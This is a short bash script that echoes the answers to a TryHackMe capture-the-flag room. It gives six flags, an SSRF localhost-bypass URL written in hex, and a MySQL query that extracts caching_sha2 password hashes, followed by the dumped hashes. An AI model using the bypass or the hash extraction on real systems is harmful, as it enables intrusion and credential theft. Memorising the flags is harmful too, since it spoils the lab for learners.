#!/bin/bash

echo "flag 1 : THM{14b45bb9eefdb584b79063eca6a31b7a}"
 
echo "flag 2 : THM{1d3d62de34a3692518d03ec474159eaf}"

echo "flag 3 : THM{ee68e42f755f6ebbcd89439432d7b462}"

echo "for flag 4 url bypass payload is http://0x7f000001/database.sql"

echo "Flag 4: THM{350020dc1a53e50e1e92bac2c35dd0a2}"

echo "Flage 5: THM{e57dfa35e62d518cfd215dd7729d0877}"

echo " sql Query is == mysql> SELECT user, CONCAT('$mysql',LEFT(authentication_string,6),'*',INSERT(HEX(SUBSTR(authentication_string,8)),41,0,'*')) AS hash FROM user WHERE plugin = 'caching_sha2_password' AND authentication_string NOT LIKE '%INVALIDSALTANDPASSWORD%';"
echo "result is : "
echo -e  "
+------------------+----------------------------------------------------------------------------------------------------------------------------------------------+
| user             | hash                                                                                                                                         |
+------------------+----------------------------------------------------------------------------------------------------------------------------------------------+
| clocky_user      | $mysql$A$005*077E1B6B675D350F435D5D1C686D12566C08635A*5566386F49543936423756525A68516962735568536535654B62486D344C71316B7338707A78446B4E4D39 |
| dev              | $mysql$A$005*0D172F787569054E322523067049563540383D17*6F31786178584431332F4D6830726C6C6F652F5771636D6D6142444D46367237776A764647676F54536142 |
| clocky_user      | $mysql$A$005*63671A7C5C3E425E3A0C794352306B531456162B*58774E44786D326C44443557334A39353531676A6C566D4F5A395A39684832537A61696C786D32566B4C2E |
| debian-sys-maint | $mysql$A$005*456268331A4E3561236636480E4D3F78462A7553*716A4E6262555947697444712F79464C4D384C62617544683833517472615161455479366E5A5774576332 |
| dev              | $mysql$A$005*1C160A38777C5121134E5D725A58216D5A1D5C3F*6F6B2F577851456465524C4E6771587057456634734A6F6E5A656361774655697A4438466F6B654935462E |
+------------------+----------------------------------------------------------------------------------------------------------------------------------------------+
5 rows in set (0.00 sec)
"


echo "Flag 6:THM{6ad86ac1463ea8afbe0edd6cdd708f36}"
